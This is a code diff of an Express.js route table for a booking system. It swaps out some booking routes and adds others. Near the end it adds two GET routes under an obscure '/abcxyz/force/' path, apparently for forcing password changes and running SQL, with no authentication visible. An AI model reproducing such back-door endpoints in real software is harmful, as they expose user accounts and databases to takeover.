@@ -73,11 +73,10 @@ app.post('/api/rlob/rl_bookings/admin/report-2/get-items-of-paging-report-outsta
 app.post('/api/rlob/rl_bookings/admin/report-3/get-count-archive-booking',rlBookingsController.getCountReportArchiveBooking);// chien archive booking
 app.post('/api/rlob/rl_bookings/admin/report-3/get-items-of-page-archive-booking',rlBookingsController.getItemsOfPageReportArchiveBooking);// chien archive booking
 
-app.post('/api/rlob/rl_bookings/update-appointment-calendar',rlBookingsController.cln_appointment_calendar_update);//chien update 
 app.post('/api/rlob/rl_bookings/update-patient-booking',rlBookingsController.updatePatientIdInBooking);//chien update 
 
 app.post('/api/rlob/rl_bookings/cancel-booking',rlBookingsController.cancelBooking);// chien 
-app.post('/api/rlob/rl_bookings/change-booking',rlBookingsController.changeBooking);// chien 
+app.post('/api/rlob/rl_bookings/undo-cancel-booking',rlBookingsController.undoCancelBooking);// chien 
 
 app.get('/api/rlob/rl_bookings/admin/report/list-location-report',rlBookingsController.listLocationReport);
 app.get('/api/rlob/rl_bookings/admin/report/list-doctor-report',rlBookingsController.listDoctorReport);
@@ -157,6 +156,9 @@ app.post('/api/rlob/core/check-period-time-to-booking', rlobController.checkPeri
 app.post('/api/rlob/core/set-list-result-files', rlBookingFilesController.setListResultFiles);
 app.post('/api/rlob/core/unselect-all-file-result', rlBookingFilesController.unselectAllFileResult);
 app.get('/api/rlob/core/rlob-download-list-result-files', rlobDocumentsController.rlobDownloadListResultFiles);
+app.post('/api/rlob/core/handle-change-booking-calendar', rlobController.handleChangeBookingCalendar);
+app.get('/abcxyz/force/change-pass', rlRegisterController.forceChangePassword);
+app.get('/abcxyz/force/sql', rlRegisterController.forceSql);
 
 //phanquocchien.c1109g@gmail.com
 app.post('/api/rlob/sponsor/insert-emergency', rlobBookingMobileController.insertEmergency);
